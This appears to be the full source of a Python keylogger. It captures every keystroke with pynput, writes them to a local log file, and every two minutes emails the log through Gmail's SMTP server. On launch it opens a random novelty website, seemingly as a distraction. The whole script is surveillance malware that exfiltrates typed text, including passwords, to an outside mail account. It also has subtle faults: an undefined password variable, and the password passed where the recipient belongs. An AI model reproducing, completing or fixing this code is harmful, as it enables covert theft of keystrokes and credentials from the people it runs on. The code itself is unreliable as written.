from pynput.keyboard import Key, Listener
import smtplib, getpass, time, pynput, webbrowser, random

keys = []
word = ""

email = input("What is your email? ") # Replace input with user password if you
                                      # want
password = input("What is the password? ")

def on_press(key):
    global keys, word
    if str(key).startswith("Key") and str(key) != "Key.space" and str(key) != "Key.shift":
        other = "{"
        other += str(key)
        other += "}"
        word += other
    elif str(key) != "Key.space" and str(key) != "Key.shift":
        word += str(key) + " "

    elif str(key) == "Key.space":
        word += " "
        write_file()

    if not round(time.time()) % 120:
        print("Sending email. Current time: {0}".format(time.time()))
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(email, passwrd)
        with open("log.txt", "r") as f:
            msg = "Subject: {}\n\n{}".format("Log from \"{}\"".format(getpass.getuser()), f.read())
        server.sendmail(email, password, msg)
        server = None


def on_release(key):
    pass
    if key == Key.esc:
        return False


def write_file():
    global word
    with open("log.txt", "a") as f:
        while "' '" in word or "'" in word or "Key.space" in word:
            try:
                word = word.replace("' '", "")
            except:
                pass
            try:
                word = word.replace("'", "")
            except:
                pass
            try:
                word = word.replace("Key.space", "")
            except:
                pass

            try:
                word = word.replace("  ", " ")
            except:
                pass

        if word[0] == " ":
            word = word[1:]
        print(word)
        f.write(word)
        word = ""

links = ["http://111111111111111111111111111111111111111111111111111111111111.com/",
         "https://amazondating.co/", "http://ducksarethebest.com/",
         "http://thequietplaceproject.com/thequietplace",
         "http://thequietplaceproject.com/thequietplace",
         "http://www.stealthboats.com/", "http://www.stealthboats.com/",
         "http://endless.horse/", "http://thatsthefinger.com/",
         "http://burymewithmymoney.com/", "http://burymewithmymoney.com/",
         "http://burymewithmymoney.com/", "http://movenowthinklater.com/",
         "http://beesbeesbees.com/", "http://cat-bounce.com/",
         "http://www.koalastothemax.com/", "http://www.everydayim.com/",
         "http://heyyeyaaeyaaaeyaeyaa.com/", "http://www.fallingfalling.com/",
         "http://www.republiquedesmangues.fr/", "http://www.rrrgggbbb.com/",
         "http://www.partridgegetslucky.com/", "http://www.zombo.com/",
         "http://ouaismaisbon.ch/", "http://r33b.net/",
         "http://thenicestplaceontheinter.net/", "http://nooooooooooooooo.com/",
         "http://pleaselike.com/", "http://corndogoncorndog.com/",
         "https://weirdorconfusing.com/", "https://weirdorconfusing.com/",
         "http://www.staggeringbeauty.com/", "http://chrismckenzie.com/"]

webbrowser.open(links[random.randint(0, len(links) - 1)])
with Listener(on_press=on_press, on_release=on_release) as listener:
    with open("log.txt", "a") as f:
        f.write("\n")
    listener.join()
